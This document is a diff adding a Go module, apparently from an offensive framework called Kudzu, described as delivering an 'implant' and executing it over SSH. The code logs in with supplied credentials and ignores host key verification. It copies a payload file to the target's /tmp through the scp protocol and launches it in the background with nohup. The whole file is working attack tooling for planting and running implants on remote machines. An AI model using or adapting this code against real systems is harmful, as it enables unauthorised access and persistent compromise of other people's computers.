@@ -1,0 +1,79 @@
+/*{
+Name: SSH Delivery
+Author: TerminalJockey
+Date: 3/11/2021
+Description: Deliver implant and execute via ssh
+Type:CompileAndRun
+Options:
+{
+    "Username":"",
+    "Password":"",
+	"Rhost":"",
+	"Rport":"",
+	"Directory":"",
+    "Filename":"",
+}
+}*/
+
+
+package main
+
+import (
+	"fmt"
+	"log"
+	"os"
+	"strings"
+
+	"golang.org/x/crypto/ssh"
+)
+
+func main() {
+
+	conf := &ssh.ClientConfig{
+		User: "{{.Username}}",
+		Auth: []ssh.AuthMethod{
+			ssh.Password("{{.Password}}"),
+		},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+	}
+
+	client, err := ssh.Dial("tcp", "{{.Rhost}}:{{.Rport}}", conf)
+	if err != nil {
+		log.Println(err)
+	}
+	defer client.Close()
+
+	sess, err := client.NewSession()
+	if err != nil {
+		log.Println(err)
+	}
+	defer sess.Close()
+	go func() {
+		w, _ := sess.StdinPipe()
+		defer w.Close()
+		gpath := os.Getenv("GOPATH")
+		var rebuild string
+		if strings.Contains(gpath, "\\") == true {
+			gsep := strings.Split(gpath, "\\")
+			rebuild = strings.Join(gsep[1:], "/")
+		} else {
+			rebuild = gpath
+		}
+
+		content, _ := os.ReadFile("/"+rebuild+"/src/github.com/TerminalJockey/Kudzu/tmp/{{.Filename}}")
+		fmt.Fprintln(w, "C0777", len(content), "{{.Filename}}")
+		w.Write(content)
+		if err != nil {
+			log.Println(err)
+		}
+		fmt.Fprint(w, "\x00")
+	}()
+	if err := sess.Run("/usr/bin/scp -tr /tmp/"); err != nil {
+		log.Println(err)
+	}
+	callcmd, err := client.NewSession()
+	if err != nil {
+		log.Println(err)
+	}
+	callcmd.Start("nohup /tmp/{{.Filename}}")
+}
